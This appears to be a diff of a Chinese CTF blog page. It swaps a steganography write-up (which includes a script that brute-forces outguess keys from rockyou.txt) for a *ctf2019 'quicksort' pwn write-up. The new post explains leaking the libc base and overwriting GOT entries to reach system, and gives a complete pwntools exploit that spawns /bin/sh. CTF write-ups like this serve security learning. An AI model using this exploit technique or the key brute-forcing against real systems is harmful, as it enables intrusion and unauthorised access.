@@ -15,17 +15,19 @@
 
 
 
-<meta name="description" content="记录一下记录一下。 HGAME2019WEEK3的misc1。">
+<meta name="description" content="leak基址+覆写GOT表">
 <meta property="og:type" content="article">
-<meta property="og:title" content="outguess">
-<meta property="og:url" content="http://yoursite.com/2019/02/10/outguess/index.html">
+<meta property="og:title" content="*ctf2019-quicksort">
+<meta property="og:url" content="http://yoursite.com/2019/05/04/ctf2019-quicksort/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="记录一下记录一下。 HGAME2019WEEK3的misc1。">
+<meta property="og:description" content="leak基址+覆写GOT表">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-02-12T16:03:53.466Z">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1g2plw40j34j30ie0cm0uu.jpg">
+<meta property="og:updated_time" content="2019-05-04T13:38:21.924Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="outguess">
-<meta name="twitter:description" content="记录一下记录一下。 HGAME2019WEEK3的misc1。">
+<meta name="twitter:title" content="*ctf2019-quicksort">
+<meta name="twitter:description" content="leak基址+覆写GOT表">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1g2plw40j34j30ie0cm0uu.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +59,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>outguess | 4eriri&#39;s blog</title>
+<title>*ctf2019-quicksort | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -189,11 +191,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-outguess" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ctf2019-quicksort" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/02/10/outguess/" class="article-date">
-      <time datetime="2019-02-10T09:53:55.000Z" itemprop="datePublished">2019-02-10</time>
+      <a href="/2019/05/04/ctf2019-quicksort/" class="article-date">
+      <time datetime="2019-05-04T13:18:55.000Z" itemprop="datePublished">2019-05-04</time>
 </a>
 
 
@@ -208,7 +210,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      outguess
+      *ctf2019-quicksort
     </h1>
   
 
@@ -225,20 +227,12 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>记录一下记录一下。</p>
-<p>HGAME2019WEEK3的misc1。</p>
+        <p>leak基址+覆写GOT表</p>
 <a id="more"></a>
-<p>题目文件为一个mp4，下载下来看了一遍就GG了。</p>
-<p>之后题目给了hint：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hint1:DeEgger Embedder</span><br><span class="line">hint2:outguess</span><br></pre></td></tr></table></figure>
-<p>直接对着上网去搜就行了，首先使用DeEgger Embedder把视频提取一下，得到一个exe文件，查看hex发现应该是jpg文件，改好后缀后就该用outguess了。</p>
-<p>outguess使用方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k key -r xxx.jpg xxx.txt</span><br></pre></td></tr></table></figure>
-<p>但是这里密码是需要自己来爆破的，题目提示了是kali里的rockyou.txt里的密码，虽然我没装kali但是网上也可以找到这个文件，写个脚本把符合要求的密码全部写到另一个文件里，然后开始爆破。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">f=open(&quot;sec.txt&quot;,&apos;rb&apos;) </span><br><span class="line">line=f.readline()</span><br><span class="line">i=1</span><br><span class="line">while line:</span><br><span class="line">	command=&quot;outguess -k &quot;+line.replace(&quot;\n&quot;,&quot;&quot;)+&quot; -r /Users/4eriri/Downloads/flag.jpg /Users/4eriri/Downloads/&quot;+str(i)+&quot;.txt&quot;</span><br><span class="line">	os.system(command)</span><br><span class="line">	line=f.readline()</span><br><span class="line">	i+=1</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-<p>这样每次爆破得到的文件就会以次数命名保存下来，然后按文件大小排序一下，那些几十个字节大小的txt就很有可能是正确密码爆破得到的。</p>
-<p>最后在206.txt中发现了flag，正确的key是<code>securitypassword</code>。</p>
-
+<h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1g2plw40j34j30ie0cm0uu.jpg" alt=""></p>
+<p>在输入数字时，能够通过溢出覆盖ptr指针和控制i的大小。IDA分析发现，<code>free_got</code>在<code>gets_got的</code>后面，把ptr覆盖成<code>gets_got</code>的地址，i修改成1，这样实际上就把<code>free_got</code>修改成了main函数地址，并且由于并且对<code>gets_got</code>进行修改，排序完输出时就leak出来<code>gets_got</code>，得到了libc基址，再把<code>atoi_got</code>修改成<code>system</code>，之后输入<code>/bin/sh</code>即可获取shell。</p>
+<p>leak出的地址是负数，自作聪明+0x100000000强行转成了正数，结果就是一直没做出来。赛后看了dalao们的wp才发现不需要这样做orz</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *main=0x080489C9sh = process(&apos;./quicksort/quicksort&apos;)#sh = remote(&apos;34.92.96.238&apos;,10000)elf= ELF(&apos;./quicksort/quicksort&apos;)libc= ELF(&apos;./quicksort/libc.so.6&apos;)gets_got=elf.got[&apos;gets&apos;]atoi_got=elf.got[&apos;atoi&apos;]gets=libc.symbols[&apos;gets&apos;]system=libc.symbols[&apos;system&apos;]sh.recvuntil(&apos;sort?\n&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;number:&apos;)sh.sendline(str(main)+&apos;\x00&apos;*7+p32(1)*3+p32(gets_got))sh.recvuntil(&apos;result:\n&apos;)leak=int(sh.recvline())libcbase=leak-getssh.recvuntil(&apos;sort?\n&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;number:&apos;)sh.sendline(str(libcbase+system)+&apos;\x00&apos;*6+p32(2)+p32(0)*2+p32(atoi_got))sh.recvuntil(&apos;number:&apos;)sh.sendline(&apos;/bin/sh\x00&apos;)sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -246,13 +240,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/02/10/outguess/">outguess</a></p>
+        <p><span>本文标题:</span><a href="/2019/05/04/ctf2019-quicksort/">*ctf2019-quicksort</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2019-02-10, 17:53:55</p>
-        <p><span>最后更新:</span>2019-02-13, 00:03:53</p>
+        <p><span>发布时间:</span>2019-05-04, 21:18:55</p>
+        <p><span>最后更新:</span>2019-05-04, 21:38:21</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/02/10/outguess/" title="outguess">http://yoursite.com/2019/02/10/outguess/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/02/10/outguess/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/04/ctf2019-quicksort/" title="*ctf2019-quicksort">http://yoursite.com/2019/05/04/ctf2019-quicksort/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/05/04/ctf2019-quicksort/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -264,16 +258,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/">
-                    HGAME2019-Say-Muggle-Code a.k.a. SMC
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/02/08/Math简单/">
-                    HGAME2019-Math简单
+                <a href="/2019/04/19/DDCTF2019-Confused/">
+                    DDCTF2019-Confused
                 </a>
             </div>
         
@@ -285,7 +273,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单分析"><span class="toc-number">1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li></ol>
         
     </div>
     <style>
@@ -321,7 +309,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"outguess　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"*ctf2019-quicksort　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -340,8 +328,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2019/02/10/outguess/';
-            this.page.identifier = '2019/02/10/outguess/';
+            this.page.url = 'http://yoursite.com/2019/05/04/ctf2019-quicksort/';
+            this.page.identifier = '2019/05/04/ctf2019-quicksort/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -363,15 +351,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/" title="上一篇: HGAME2019-Say-Muggle-Code a.k.a. SMC">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/02/08/Math简单/" title="下一篇: HGAME2019-Math简单">
+            <a href="/2019/04/19/DDCTF2019-Confused/" title="下一篇: DDCTF2019-Confused">
                 <i class="fa fa-angle-right"></i>
             </a>
         
